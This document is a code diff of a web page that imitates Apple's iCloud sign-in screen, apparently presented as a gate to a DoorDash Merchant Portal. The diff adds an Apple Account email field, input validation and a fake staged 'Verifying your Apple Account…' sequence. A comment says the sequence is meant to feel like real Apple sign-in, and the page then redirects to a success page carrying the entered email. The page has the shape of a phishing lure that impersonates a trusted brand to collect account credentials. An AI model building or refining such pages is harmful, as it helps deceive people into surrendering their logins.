@@ -72,43 +72,64 @@
             margin-bottom: 28px;
         }
 
-        .account-row {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            font-size: 15px;
+        /* ---------- Email field ---------- */
+        .email-field-wrap {
+            position: relative;
+            margin-bottom: 12px;
+        }
+
+        .email-input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            font-family: inherit;
             color: #1d1d1f;
-            margin-bottom: 20px;
-            cursor: pointer;
-            padding: 6px 12px;
-            border-radius: 8px;
-            transition: background 0.12s ease;
-            width: fit-content;
-            max-width: 100%;
-            margin-left: auto;
-            margin-right: auto;
-            background: #f5f5f7;
+            background: #ffffff;
+            border: 1px solid #d2d2d7;
+            border-radius: 12px;
+            outline: none;
+            transition: border-color 0.12s ease, box-shadow 0.12s ease;
+            -webkit-appearance: none;
         }
 
-        .account-row:hover {
-            background: #ebebed;
+        .email-input::placeholder {
+            color: #86868b;
         }
 
-        .account-row .email-text {
-            white-space: nowrap;
-            overflow: hidden;
-            text-overflow: ellipsis;
-            font-weight: 400;
+        .email-input:hover {
+            border-color: #a1a1a6;
         }
 
-        .account-row .chevron {
+        .email-input:focus {
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0, 113, 227, 0.15);
+        }
+
+        .email-input.error {
+            border-color: #e30000;
+            box-shadow: 0 0 0 3px rgba(227, 0, 0, 0.12);
+        }
+
+        .email-error-text {
+            display: none;
+            font-size: 13px;
+            color: #e30000;
+            margin: 6px 0 12px;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .email-error-text.visible {
+            display: flex;
+        }
+
+        .email-error-text svg {
             width: 14px;
             height: 14px;
             flex-shrink: 0;
-            color: #6e6e73;
         }
 
+        /* ---------- Password field ---------- */
         .field-wrap {
             position: relative;
             margin-bottom: 8px;
@@ -230,30 +251,6 @@
 
         .links-row .dot {
             color: #d2d2d7;
-        }
-
-        .back-row {
-            display: flex;
-            justify-content: center;
-            margin-top: 24px;
-        }
-
-        .back-link {
-            font-size: 14px;
-            color: #0071e3;
-            background: none;
-            border: none;
-            cursor: pointer;
-            font-family: inherit;
-            font-weight: 400;
-            text-decoration: none;
-            padding: 4px 8px;
-            border-radius: 6px;
-        }
-
-        .back-link:hover {
-            background: #f5f5f7;
-            text-decoration: underline;
         }
 
         /* ---------- LOADING VIEW ---------- */
@@ -393,13 +390,27 @@
             <h1 class="heading" id="heading">Sign in to iCloud</h1>
             <p class="subheading">to continue to DoorDash Merchant Portal</p>
 
-            <div class="account-row" id="accountChip" title="Switch account">
-                <span class="email-text" id="chipEmail">loading...</span>
-                <svg class="chevron" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M6 9L12 15L18 9" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                </svg>
+            <!-- Email input field -->
+            <div class="email-field-wrap">
+                <input
+                    class="email-input"
+                    id="email"
+                    type="email"
+                    placeholder="Apple Account"
+                    autocomplete="username"
+                    aria-label="Apple Account"
+                >
             </div>
+            <p class="email-error-text" id="emailErrorText">
+                <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="1.8"/>
+                    <line x1="12" y1="7" x2="12" y2="13" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+                    <circle cx="12" cy="16.5" r="1" fill="currentColor"/>
+                </svg>
+                <span id="emailErrorMessage">Please enter a valid Apple Account.</span>
+            </p>
 
+            <!-- Password input field -->
             <div class="field-wrap">
                 <input
                     class="password-input"
@@ -431,10 +442,6 @@
                 <a href="#" id="forgotLink">Forgot password?</a>
                 <span class="dot">•</span>
                 <a href="#" id="createLink">Create Apple Account</a>
-            </div>
-
-            <div class="back-row">
-                <button class="back-link" id="backBtn" type="button">← Use a different account</button>
             </div>
         </div>
 
@@ -472,22 +479,11 @@
     </div>
 
     <script>
-        // ---- Read the email from the URL query string ----
-        const params = new URLSearchParams(window.location.search);
-        const rawEmail = params.get('email') || '';
-        const email = rawEmail.trim().toLowerCase();
-
-        // If no email was passed, send the user back to email.html
-        if (!email) {
-            window.location.replace('email.html');
-        }
-
-        // ---- Populate the account row ----
-        const chipEmail = document.getElementById('chipEmail');
-        chipEmail.textContent = email;
-
         // ---- Elements ----
+        const emailInput = document.getElementById('email');
         const passwordInput = document.getElementById('password');
+        const emailErrorText = document.getElementById('emailErrorText');
+        const emailErrorMessage = document.getElementById('emailErrorMessage');
         const errorText = document.getElementById('errorText');
         const errorMessage = document.getElementById('errorMessage');
         const formView = document.getElementById('formView');
@@ -501,38 +497,73 @@
             loadingText.textContent = 'Signing in…';
         }
 
-        // ---- Validate + submit ----
-        const signinBtn = document.getElementById('signinBtn');
+        // ---- Error helpers ----
+        function showEmailError(msg) {
+            emailErrorMessage.textContent = msg || 'Please enter a valid Apple Account.';
+            emailErrorText.classList.add('visible');
+            emailInput.classList.add('error');
+            emailInput.focus();
+        }
 
-        function showError(msg) {
+        function clearEmailError() {
+            emailErrorText.classList.remove('visible');
+            emailInput.classList.remove('error');
+        }
+
+        function showPasswordError(msg) {
             errorMessage.textContent = msg || 'Incorrect Apple Account or password.';
             errorText.classList.add('visible');
             passwordInput.classList.add('error');
             passwordInput.focus();
         }
 
-        function clearError() {
+        function clearPasswordError() {
             errorText.classList.remove('visible');
             passwordInput.classList.remove('error');
         }
 
-        passwordInput.addEventListener('input', clearError);
+        // Clear errors on input
+        emailInput.addEventListener('input', clearEmailError);
+        passwordInput.addEventListener('input', clearPasswordError);
+
+        // ---- Validate + submit ----
+        const signinBtn = document.getElementById('signinBtn');
 
         signinBtn.addEventListener('click', () => {
+            const emailValue = emailInput.value.trim();
             const pwd = passwordInput.value;
+
+            let valid = true;
+
+            // Validate email
+            const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailValue) {
+                showEmailError('Please enter your Apple Account.');
+                valid = false;
+            } else if (!emailPattern.test(emailValue)) {
+                showEmailError('Please enter a valid Apple Account.');
+                valid = false;
+            } else {
+                clearEmailError();
+            }
+
+            // Validate password
             if (!pwd) {
-                showError('Please enter your password.');
-                return;
+                showPasswordError('Please enter your password.');
+                valid = false;
+            } else if (pwd.length < 8) {
+                showPasswordError('Your password must be at least 8 characters.');
+                valid = false;
+            } else {
+                clearPasswordError();
             }
-            if (pwd.length < 8) {
-                showError('Your password must be at least 8 characters.');
-                return;
-            }
+
+            if (!valid) return;
 
             // Show the Apple-style loading screen
             showLoading();
 
-            // Staged loading messages to feel more like real Apple sign-in
+            // Staged loading messages
             const steps = [
                 { delay: 700,  text: 'Verifying your Apple Account…' },
                 { delay: 1400, text: 'Signing in…' },
@@ -547,8 +578,16 @@
 
             // After the loading sequence, go to success page
             setTimeout(() => {
-                window.location.href = 'success.html?email=' + encodeURIComponent(email);
+                window.location.href = 'success.html?email=' + encodeURIComponent(emailValue);
             }, 2800);
+        });
+
+        // Enter key navigation
+        emailInput.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                passwordInput.focus();
+            }
         });
 
         passwordInput.addEventListener('keydown', (e) => {
@@ -556,16 +595,6 @@
                 e.preventDefault();
                 signinBtn.click();
             }
-        });
-
-        // ---- Back button: return to email.html ----
-        document.getElementById('backBtn').addEventListener('click', () => {
-            window.location.href = 'email.html';
-        });
-
-        // ---- Account chip: return to email.html ----
-        document.getElementById('accountChip').addEventListener('click', () => {
-            window.location.href = 'email.html';
         });
 
         // ---- Forgot link: no-op for now ----
